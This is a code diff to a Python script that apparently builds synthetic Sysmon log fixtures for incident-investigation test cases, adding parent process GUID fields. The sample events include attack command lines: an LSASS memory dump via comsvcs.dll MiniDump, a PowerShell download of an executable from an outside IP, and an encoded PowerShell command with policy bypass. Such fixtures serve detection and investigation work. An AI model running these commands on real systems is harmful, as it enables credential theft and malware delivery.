@@ -11,7 +11,7 @@ import base64
 import json
 from pathlib import Path
 
-CASES = Path(__file__).resolve().parent / "cases"
+CASES = Path(__file__).resolve().parent / "investigator" / "cases"
 
 
 def sysmon(evid, ts, host, eventdata, rule=None):
@@ -83,6 +83,9 @@ def inc001():
         "commandLine": "\"WINWORD.EXE\" /n \"C:\\Users\\jhopkins\\Downloads\\Invoice_4471.docm\"",
         "processGuid": word_guid, "processId": "5120",
         "parentImage": "C:\\Windows\\explorer.exe", "user": "CORP\\jhopkins",
+        # Real Sysmon always records the parent GUID; explorer.exe started long
+        # before the retained window, so its own creation event is absent.
+        "parentProcessGuid": "{aaaa1111-0000-0000-0001-0000000000e0}",
     })
     d["id"] = rid("INC001-0001"); docs.append(d)
     d = sysmon(1, "2026-09-29T14:02:12.500Z", host, {
@@ -142,6 +145,7 @@ def inc002():
         "image": "C:\\Windows\\System32\\cmd.exe",
         "commandLine": "cmd.exe /c rundll32 C:\\Windows\\System32\\comsvcs.dll, MiniDump 700 C:\\Users\\Public\\lsass.dmp full",
         "processGuid": "{bbbb2222-0000-0000-0002-000000000001}", "processId": "4102",
+        "parentProcessGuid": "{bbbb2222-0000-0000-0002-0000000000e0}",
         "parentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "user": "CORP\\svc-backup",
     })
     d["id"] = "INC002-0001"; docs.append(d)
@@ -192,6 +196,7 @@ def inc003():
         "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         "commandLine": "powershell.exe -c \"iwr http://45.77.12.8/upd.exe -OutFile $env:APPDATA\\upd.exe\"",
         "processGuid": ps_guid, "processId": "7020",
+        "parentProcessGuid": "{cccc3333-0000-0000-0003-0000000000e0}",
         "parentImage": "C:\\Windows\\System32\\cmd.exe", "user": "CORP\\dlee",
     })
     d["id"] = "INC003-0001"; docs.append(d)
@@ -288,6 +293,8 @@ def inc005():
         "commandLine": f"powershell.exe -NonInteractive -ExecutionPolicy Bypass -EncodedCommand {encoded}",
         "processGuid": ps_guid, "processId": "8100",
         "parentImage": "C:\\Program Files\\Microsoft Configuration Manager\\bin\\x64\\AgentExecutor.exe",
+        # Long-running management agent: its creation event predates the window.
+        "parentProcessGuid": "{dddd5555-0000-0000-0005-0000000000e0}",
         "parentCommandLine": "AgentExecutor.exe -powershell ...", "user": "NT AUTHORITY\\SYSTEM",
     }, rule={"id": "92052", "level": 12, "description": "Powershell with encoded arguments"})
     d["id"] = "INC005-0001"; docs.append(d)
